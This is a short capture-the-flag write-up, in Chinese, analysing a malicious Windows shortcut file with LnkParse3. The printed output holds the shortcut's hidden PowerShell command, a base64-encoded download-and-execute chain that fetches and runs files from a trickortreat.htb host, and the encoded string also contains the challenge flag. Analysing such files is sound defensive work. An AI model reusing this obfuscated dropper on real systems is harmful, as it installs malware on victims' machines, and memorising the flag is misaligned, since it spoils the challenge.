# The Shortcut Haunting

## Solution

題目給一個捷徑檔，使用 [LnkParse3](https://github.com/Matmaus/LnkParse3) 看裡面的內容

```console
D13@MacBook-Pro Downloads % lnkparse trick_or_treat.lnk 
Windows Shortcut Information:
   Guid: 00021401-0000-0000-C000-000000000046
   Link flags: HasTargetIDList | HasName | HasRelativePath | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16621)
   File flags: (0)
   Creation time: null
   Accessed time: null
   Modified time: null
   File size: 0
   Icon index: 70
   Windowstyle: SW_SHOWMINNOACTIVE
   Hotkey: CONTROL - C {0x4302}

   TARGET:
      Items:
      -  Root Folder:
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
      -  Volume Item:
            Flags: '0xf'
            Data: null
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: Windows
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: System32
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: WindowsPowerShell
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: v1.0
      -  File entry:
            Flags: Is file
            File size: 0
            File attribute flags: 0
            Primary name: powershell.exe

   LINK INFO: {}

   DATA:
      Description: Trick or treat
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Command line arguments: -WindowStyle hidden -NoExit -Command "$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf
         = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf"9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
      Icon location: C:\Windows\System32\shell32.dll

   EXTRA:
      ICON LOCATION BLOCK:
         Size: 788
         Target ansi: '%SystemRoot%\System32\shell32.dll'
         Target unicode: '%SystemRoot%\System32\shell32.dll'
      SPECIAL FOLDER LOCATION BLOCK:
         Size: 16
         Special folder id: 37
         Offset: 221
      KNOWN FOLDER LOCATION BLOCK:
         Size: 28
         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
         Offset: 221
      METADATA PROPERTIES BLOCK:
         Size: 149
         Property store:
         -  Storage size: 137
            Version: '0x53505331'
            Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
            Serialized property values:
            -  Value size: 109
               Id: 4
               Value: S-1-5-21-3849600975-1564034632-632203374-1001
               Value type: VT_LPWSTR
```

內容有一串編碼過的字串 `$fko`，使用 base64 解碼（[Cyber Chef](https://gchq.github.io/CyberChef/)）即可找到 flag